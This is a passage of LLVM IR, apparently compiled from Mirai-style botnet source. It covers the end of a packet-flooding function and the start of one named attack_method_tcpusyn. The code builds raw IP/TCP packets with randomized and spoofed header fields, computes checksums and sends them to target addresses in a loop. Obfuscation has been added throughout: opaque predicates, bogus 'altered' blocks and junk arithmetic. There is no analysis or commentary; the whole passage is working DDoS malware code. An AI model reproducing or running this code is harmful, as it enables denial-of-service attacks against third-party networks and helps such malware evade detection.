  %445 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 9
  store i32 %444, i32* %446, align 4
  br label %447

; <label>:447:                                    ; preds = %426, %407
  %448 = load i32, i32* %26, align 4
  %449 = icmp eq i32 %448, -1
  br i1 %449, label %450, label %470

; <label>:450:                                    ; preds = %447
  %451 = load i32, i32* @x.43
  %452 = load i32, i32* @y.44
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %450
  %459 = call i32 @rand_next()
  %460 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 8
  store i32 %459, i32* %461, align 4
  %462 = load i32, i32* @x.43
  %463 = load i32, i32* @y.44
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %470

; <label>:470:                                    ; preds = %originalBBpart273, %447
  %471 = load i32, i32* @x.43
  %472 = load i32, i32* @y.44
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %470
  %479 = load i16, i16* %13, align 2
  %480 = zext i16 %479 to i32
  %481 = icmp eq i32 %480, 65535
  %482 = load i32, i32* @x.43
  %483 = load i32, i32* @y.44
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %481, label %490, label %512

; <label>:490:                                    ; preds = %originalBBpart277
  %491 = load i32, i32* @x.43
  %492 = load i32, i32* @y.44
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %490
  %499 = call i32 @rand_next()
  %500 = and i32 %499, 65535
  %501 = trunc i32 %500 to i16
  %502 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 3
  store i16 %501, i16* %503, align 4
  %504 = load i32, i32* @x.43
  %505 = load i32, i32* @y.44
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBBpart287, label %originalBB79alteredBB

originalBBpart287:                                ; preds = %originalBB79
  br label %512

; <label>:512:                                    ; preds = %originalBBpart287, %originalBBpart277
  %513 = load i16, i16* %16, align 2
  %514 = zext i16 %513 to i32
  %515 = icmp eq i32 %514, 65535
  br i1 %515, label %516, label %538

; <label>:516:                                    ; preds = %512
  %517 = load i32, i32* @x.43
  %518 = load i32, i32* @y.44
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %516
  %525 = call i32 @rand_next()
  %526 = and i32 %525, 65535
  %527 = trunc i32 %526 to i16
  %528 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 0
  store i16 %527, i16* %529, align 4
  %530 = load i32, i32* @x.43
  %531 = load i32, i32* @y.44
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %538

; <label>:538:                                    ; preds = %originalBBpart291, %512
  %539 = load i16, i16* %17, align 2
  %540 = zext i16 %539 to i32
  %541 = icmp eq i32 %540, 65535
  br i1 %541, label %542, label %548

; <label>:542:                                    ; preds = %538
  %543 = call i32 @rand_next()
  %544 = and i32 %543, 65535
  %545 = trunc i32 %544 to i16
  %546 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 1
  store i16 %545, i16* %547, align 2
  br label %548

; <label>:548:                                    ; preds = %542, %538
  %549 = load i32, i32* @x.43
  %550 = load i32, i32* @y.44
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %548
  %557 = load i32, i32* %18, align 4
  %558 = icmp eq i32 %557, 65535
  %559 = load i32, i32* @x.43
  %560 = load i32, i32* @y.44
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %558, label %567, label %571

; <label>:567:                                    ; preds = %originalBBpart295
  %568 = call i32 @rand_next()
  %569 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 2
  store i32 %568, i32* %570, align 4
  br label %571

; <label>:571:                                    ; preds = %567, %originalBBpart295
  %572 = load i32, i32* %19, align 4
  %573 = icmp eq i32 %572, 65535
  br i1 %573, label %574, label %578

; <label>:574:                                    ; preds = %571
  %575 = call i32 @rand_next()
  %576 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 3
  store i32 %575, i32* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %574, %571
  %579 = load i8, i8* %20, align 1
  %580 = icmp ne i8 %579, 0
  br i1 %580, label %581, label %603

; <label>:581:                                    ; preds = %578
  %582 = load i32, i32* @x.43
  %583 = load i32, i32* @y.44
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %581
  %590 = call i32 @rand_next()
  %591 = and i32 %590, 65535
  %592 = trunc i32 %591 to i16
  %593 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load i32, i32* @x.43
  %596 = load i32, i32* @y.44
  %597 = sub i32 %595, 1
  %598 = mul i32 %595, %597
  %599 = urem i32 %598, 2
  %600 = icmp eq i32 %599, 0
  %601 = icmp slt i32 %596, 10
  %602 = or i1 %600, %601
  br i1 %602, label %originalBBpart2105, label %originalBB97alteredBB

originalBBpart2105:                               ; preds = %originalBB97
  br label %603

; <label>:603:                                    ; preds = %originalBBpart2105, %578
  %604 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %605 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %604, i32 0, i32 7
  store i16 0, i16* %605, align 2
  %606 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %607 = bitcast %struct.iphdr* %606 to i16*
  %608 = call zeroext i16 @checksum_generic(i16* %607, i32 20)
  %609 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 7
  store i16 %608, i16* %610, align 2
  %611 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 6
  store i16 0, i16* %612, align 4
  %613 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %614 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %615 = bitcast %struct.tcphdr* %614 to i8*
  %616 = call zeroext i16 @htons(i16 zeroext 40) #7
  %617 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %613, i8* %615, i16 zeroext %616, i32 40)
  %618 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 6
  store i16 %617, i16* %619, align 4
  %620 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 1
  %622 = load i16, i16* %621, align 2
  %623 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %624 = load i32, i32* %9, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i64 %625
  %627 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %626, i32 0, i32 0
  %628 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %627, i32 0, i32 1
  store i16 %622, i16* %628, align 2
  %629 = load i32, i32* %10, align 4
  %630 = load i8*, i8** %30, align 8
  %631 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %632 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %633 = load i32, i32* %9, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i64 %634
  %636 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i32 0, i32 0
  %637 = bitcast %struct.sockaddr_in* %636 to %struct.sockaddr*
  store %struct.sockaddr* %637, %struct.sockaddr** %631, align 8
  %638 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %639 = load %struct.sockaddr*, %struct.sockaddr** %638, align 8
  %640 = call i64 @sendto(i32 %629, i8* %630, i64 60, i32 16384, %struct.sockaddr* %639, i32 16)
  br label %641

; <label>:641:                                    ; preds = %603
  %642 = load i32, i32* @x.43
  %643 = load i32, i32* @y.44
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %641
  %650 = load i32, i32* %9, align 4
  %651 = add nsw i32 %650, 1
  store i32 %651, i32* %9, align 4
  %652 = load i32, i32* @x.43
  %653 = load i32, i32* @y.44
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2111, label %originalBB107alteredBB

originalBBpart2111:                               ; preds = %originalBB107
  br label %402

; <label>:660:                                    ; preds = %402
  br label %385

; <label>:661:                                    ; preds = %136, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %98
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %115
  store i32 1, i32* %9, align 4
  %662 = load i32, i32* %10, align 4
  %663 = bitcast i32* %9 to i8*
  %664 = call i32 @setsockopt(i32 %662, i32 0, i32 3, i8* %663, i32 4) #6
  %665 = icmp eq i32 %664, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %145
  %666 = call noalias i8* @calloc(i64 128, i64 1) #6
  %667 = load i8**, i8*** %11, align 8
  %668 = load i32, i32* %9, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds i8*, i8** %667, i64 %669
  store i8* %666, i8** %670, align 8
  %671 = load i8**, i8*** %11, align 8
  %672 = load i32, i32* %9, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds i8*, i8** %671, i64 %673
  %675 = load i8*, i8** %674, align 8
  %676 = bitcast i8* %675 to %struct.iphdr*
  store %struct.iphdr* %676, %struct.iphdr** %27, align 8
  %677 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %678 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %677, i64 1
  %679 = bitcast %struct.iphdr* %678 to %struct.tcphdr*
  store %struct.tcphdr* %679, %struct.tcphdr** %28, align 8
  %680 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i64 1
  %682 = bitcast %struct.tcphdr* %681 to i8*
  store i8* %682, i8** %29, align 8
  %683 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %684 = bitcast %struct.iphdr* %683 to i8*
  %685 = load i8, i8* %684, align 4
  %_ = shl i8 %685, 15
  %_7 = sub i8 %685, 15
  %gen = mul i8 %_7, 15
  %_8 = sub i8 0, %685
  %gen9 = add i8 %_8, 15
  %_10 = sub i8 %685, 15
  %gen11 = mul i8 %_10, 15
  %_12 = sub i8 %685, 15
  %gen13 = mul i8 %_12, 15
  %686 = and i8 %685, 15
  %_14 = sub i8 %686, 64
  %gen15 = mul i8 %_14, 64
  %_16 = shl i8 %686, 64
  %_17 = sub i8 %686, 64
  %gen18 = mul i8 %_17, 64
  %_19 = shl i8 %686, 64
  %687 = or i8 %686, 64
  store i8 %687, i8* %684, align 4
  %688 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %689 = bitcast %struct.iphdr* %688 to i8*
  %690 = load i8, i8* %689, align 4
  %_20 = sub i8 %690, -16
  %gen21 = mul i8 %_20, -16
  %_22 = sub i8 0, %690
  %gen23 = add i8 %_22, -16
  %_24 = sub i8 %690, -16
  %gen25 = mul i8 %_24, -16
  %_26 = shl i8 %690, -16
  %_27 = shl i8 %690, -16
  %_28 = sub i8 %690, -16
  %gen29 = mul i8 %_28, -16
  %_30 = shl i8 %690, -16
  %691 = and i8 %690, -16
  %_31 = sub i8 %691, 5
  %gen32 = mul i8 %_31, 5
  %_33 = sub i8 %691, 5
  %gen34 = mul i8 %_33, 5
  %_35 = sub i8 %691, 5
  %gen36 = mul i8 %_35, 5
  %_37 = shl i8 %691, 5
  %_38 = sub i8 0, %691
  %gen39 = add i8 %_38, 5
  %_40 = sub i8 0, %691
  %gen41 = add i8 %_40, 5
  %_42 = sub i8 0, %691
  %gen43 = add i8 %_42, 5
  %_44 = shl i8 %691, 5
  %692 = or i8 %691, 5
  store i8 %692, i8* %689, align 4
  %693 = load i8, i8* %12, align 1
  %694 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 1
  store i8 %693, i8* %695, align 1
  %696 = call zeroext i16 @htons(i16 zeroext 60) #7
  %697 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %698 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %697, i32 0, i32 2
  store i16 %696, i16* %698, align 2
  %699 = load i16, i16* %13, align 2
  %700 = call zeroext i16 @htons(i16 zeroext %699) #7
  %701 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i32 0, i32 3
  store i16 %700, i16* %702, align 4
  %703 = load i8, i8* %14, align 1
  %704 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %705 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %704, i32 0, i32 5
  store i8 %703, i8* %705, align 4
  %706 = load i8, i8* %15, align 1
  %707 = icmp ne i8 %706, 0
  br label %originalBB6

originalBB48alteredBB:                            ; preds = %originalBB48, %204
  %708 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %709 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %710 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %709, i32 0, i32 4
  store i16 %708, i16* %710, align 2
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %349
  %711 = load i32, i32* %9, align 4
  %_53 = shl i32 %711, 1
  %_54 = shl i32 %711, 1
  %_55 = shl i32 %711, 1
  %_56 = shl i32 %711, 1
  %_57 = sub i32 %711, 1
  %gen58 = mul i32 %_57, 1
  %_59 = shl i32 %711, 1
  %712 = add nsw i32 %711, 1
  store i32 %712, i32* %9, align 4
  br label %originalBB52

originalBB63alteredBB:                            ; preds = %originalBB63, %368
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %385
  store i32 0, i32* %9, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %450
  %713 = call i32 @rand_next()
  %714 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %715 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %714, i32 0, i32 8
  store i32 %713, i32* %715, align 4
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %470
  %716 = load i16, i16* %13, align 2
  %717 = zext i16 %716 to i32
  %718 = icmp eq i32 %717, 65535
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %490
  %719 = call i32 @rand_next()
  %_80 = shl i32 %719, 65535
  %_81 = shl i32 %719, 65535
  %_82 = sub i32 %719, 65535
  %gen83 = mul i32 %_82, 65535
  %_84 = sub i32 %719, 65535
  %gen85 = mul i32 %_84, 65535
  %720 = and i32 %719, 65535
  %721 = trunc i32 %720 to i16
  %722 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %723 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %722, i32 0, i32 3
  store i16 %721, i16* %723, align 4
  br label %originalBB79

originalBB89alteredBB:                            ; preds = %originalBB89, %516
  %724 = call i32 @rand_next()
  %725 = and i32 %724, 65535
  %726 = trunc i32 %725 to i16
  %727 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %728 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %727, i32 0, i32 0
  store i16 %726, i16* %728, align 4
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %548
  %729 = load i32, i32* %18, align 4
  %730 = icmp eq i32 %729, 65535
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %581
  %731 = call i32 @rand_next()
  %_98 = shl i32 %731, 65535
  %_99 = sub i32 0, %731
  %gen100 = add i32 %_99, 65535
  %_101 = sub i32 %731, 65535
  %gen102 = mul i32 %_101, 65535
  %_103 = shl i32 %731, 65535
  %732 = and i32 %731, 65535
  %733 = trunc i32 %732 to i16
  %734 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %735 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %734, i32 0, i32 7
  store i16 %733, i16* %735, align 2
  br label %originalBB97

originalBB107alteredBB:                           ; preds = %originalBB107, %641
  %736 = load i32, i32* %9, align 4
  %_108 = sub i32 %736, 1
  %gen109 = mul i32 %_108, 1
  %737 = add nsw i32 %736, 1
  store i32 %737, i32* %9, align 4
  br label %originalBB107
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpusyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %581

; <label>:99:                                     ; preds = %4
  %100 = load i32, i32* @x.45
  %101 = load i32, i32* @y.46
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %99
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = load i32, i32* @x.45
  %113 = load i32, i32* @y.46
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %111, label %120, label %123

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @close(i32 %121)
  br label %581

; <label>:123:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %124

; <label>:124:                                    ; preds = %317, %123
  %125 = load i32, i32* %9, align 4
  %126 = load i8, i8* %5, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %320

; <label>:129:                                    ; preds = %124
  %130 = call noalias i8* @calloc(i64 128, i64 1) #6
  %131 = load i8**, i8*** %11, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  store i8* %130, i8** %134, align 8
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %27, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i64 1
  %143 = bitcast %struct.iphdr* %142 to %struct.tcphdr*
  store %struct.tcphdr* %143, %struct.tcphdr** %28, align 8
  %144 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i64 1
  %146 = bitcast %struct.tcphdr* %145 to i8*
  store i8* %146, i8** %29, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, 15
  %151 = or i8 %150, 64
  store i8 %151, i8* %148, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, -16
  %156 = or i8 %155, 5
  store i8 %156, i8* %153, align 4
  %157 = load i8, i8* %12, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
